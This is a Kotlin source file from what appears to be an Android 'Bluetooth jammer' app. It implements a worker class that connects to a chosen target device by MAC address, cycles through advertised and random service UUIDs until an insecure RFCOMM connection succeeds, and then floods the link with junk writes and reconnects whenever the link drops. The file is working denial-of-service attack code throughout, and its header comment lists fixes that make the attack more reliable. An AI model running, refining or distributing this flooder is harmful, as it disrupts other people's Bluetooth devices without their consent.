package com.eikarna.bluetoothjammer.api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.util.Log
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.ensureActive
import kotlinx.coroutines.isActive
import java.io.IOException
import java.util.UUID

/**
 * Fixed L2CAP/RFCOMM flood worker.
 *
 * Original bugs fixed:
 * - old `while(true)` connect loop never checked isAttacking -> threads leaked.
 * - stop created a NEW instance whose scope was empty -> nothing cancelled.
 * - UUID spam ran with zero delay, hammering the stack.
 *
 * New contract: a suspending worker. [AttackManager] launches N of these and
 * cancels them on Stop. Logging goes through [onLog] so the Activity decides
 * whether to render (log switch) and stays on the UI thread.
 */
class L2capFloodAttack(private val targetAddress: String) {

    companion object {
        val BASE_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
        private const val TAG = "L2capFloodAttack"
    }

    private fun regenUuid(): UUID {
        val prefix = UUID.randomUUID().toString().split("-")[0]
        return UUID.fromString("$prefix-0000-1000-8000-00805F9B34FB")
    }

    @SuppressLint("MissingPermission")
    suspend fun execute(
        context: Context,
        adapter: BluetoothAdapter,
        onLog: (String) -> Unit,
        isRunning: () -> Boolean
    ) {
        val device: BluetoothDevice = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            onLog("Invalid MAC address: $targetAddress")
            Log.e(TAG, "Bad MAC", e)
            return
        }

        // Prefer real advertised UUIDs first (SDP), fall back to base + random.
        val sdpUuids: List<UUID> = try {
            device.fetchUuidsWithSdp()
            device.uuids?.map { it.uuid }?.take(8) ?: emptyList()
        } catch (_: Exception) { emptyList() }

        var uuidIndex = 0
        var uuid: UUID = sdpUuids.getOrNull(0) ?: BASE_UUID

        while (isRunning() && currentCoroutineContext().isActive) {
            var socket: BluetoothSocket? = null
            try {
                currentCoroutineContext().ensureActive()
                socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                socket.connect()

                if (socket.isConnected) {
                    onLog("Connection established. (UUID: $uuid)")
                    onLog("Sending payload..")
                    flood(socket, onLog, isRunning)
                    // Flood returned = link died or stop pressed; close and re-connect.
                    try { socket.close() } catch (_: IOException) {}
                    if (!isRunning()) break
                    // Brief pause before reconnect so we don't hot-spin.
                    delay(300)
                    continue
                } else {
                    try { socket.close() } catch (_: IOException) {}
                }
            } catch (err: IOException) {
                try { socket?.close() } catch (_: IOException) {}
                if (!isRunning() || !currentCoroutineContext().isActive) break
                // Next UUID: walk SDP list first, then randomize like the original.
                uuidIndex++
                uuid = when {
                    uuidIndex < sdpUuids.size -> sdpUuids[uuidIndex]
                    uuidIndex == sdpUuids.size -> BASE_UUID
                    else -> regenUuid()
                }
                onLog("Failed to connect. Generated new UUID: $uuid")
                try { delay(150) } catch (_: Exception) { break }
            } catch (e: SecurityException) {
                onLog("Missing BLUETOOTH_CONNECT permission.")
                Log.e(TAG, "perm", e)
                break
            }
        }
    }

    /** Tight write loop. Returns when link breaks or attack stops. */
    private suspend fun flood(
        socket: BluetoothSocket,
        onLog: (String) -> Unit,
        isRunning: () -> Boolean
    ) {
        val dataSize = try { socket.maxTransmitPacketSize.takeIf { it > 0 } ?: 600 } catch (_: Exception) { 600 }
        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }
        try {
            var writes = 0
            while (isRunning() && currentCoroutineContext().isActive && socket.isConnected) {
                socket.outputStream.write(sendBuffer)
                writes++
                // Yield periodically so cancellation + stats stay responsive.
                if (writes % 64 == 0) {
                    // No delay here keeps pressure high; just yield to the dispatcher.
                    kotlinx.coroutines.yield()
                }
            }
        } catch (e: IOException) {
            onLog("Link lost, retrying.. (${e.message ?: "io error"})")
        }
    }
}
